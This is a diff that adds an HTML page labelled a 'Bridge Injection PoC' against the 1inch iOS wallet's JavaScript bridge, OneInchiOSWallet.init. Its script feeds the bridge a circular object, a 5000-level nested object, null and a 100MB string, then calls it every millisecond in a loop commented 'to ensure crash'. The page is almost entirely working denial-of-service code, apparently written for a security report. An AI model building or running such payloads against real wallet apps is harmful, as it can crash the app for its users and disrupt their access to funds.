@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1inch Bridge Security PoC</title>
+</head>
+<body style="background: #0e0e10; color: #efefef; font-family: sans-serif; text-align: center; padding: 40px;">
+
+    <div style="border: 1px solid #333; padding: 20px; border-radius: 15px; background: #1c1c1e;">
+        <h2 style="color: #ff453a;">⚠️ Bridge Injection PoC</h2>
+        <p style="font-size: 14px; color: #aaa;">Target: <code>OneInchiOSWallet.init</code></p>
+        
+        <button onclick="executePoC()" style="padding: 15px 30px; background: #ff453a; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%;">
+            RUN ALL EXPLOIT VECTORS
+        </button>
+
+        <p id="status" style="margin-top: 20px; font-size: 12px; color: #666;">Status: Ready</p>
+    </div>
+
+    <script>
+    function executePoC() {
+        const bridge = window.OneInchiOSWallet;
+        const status = document.getElementById('status');
+        
+        if (!bridge) {
+            status.innerText = "Error: Bridge not detected. Use 1inch Browser.";
+            return;
+        }
+
+        try {
+            status.innerText = "Executing vectors...";
+            
+            // Vector 1: Circular Object (JSON logic bomb)
+            const circular = {}; circular.a = circular;
+            bridge.init(circular);
+
+            // Vector 2: Deep Nesting (Stack overflow test)
+            let nested = {}; let cur = nested;
+            for(let i=0; i<5000; i++) { cur.n = {}; cur = cur.n; }
+            bridge.init(nested);
+
+            // Vector 3: Null Type Injection
+            bridge.init(null);
+
+            // Vector 4: Resource Exhaustion (Memory Flood)
+            const junk = "X".repeat(100 * 1024 * 1024); // 100MB
+            bridge.init(junk);
+
+            // Infinite loop to ensure crash
+            setInterval(() => bridge.init(Date.now().toString()), 1);
+
+        } catch(e) {
+            console.log("Caught expected error: " + e.message);
+        }
+    }
+    </script>
+</body>
+</html>
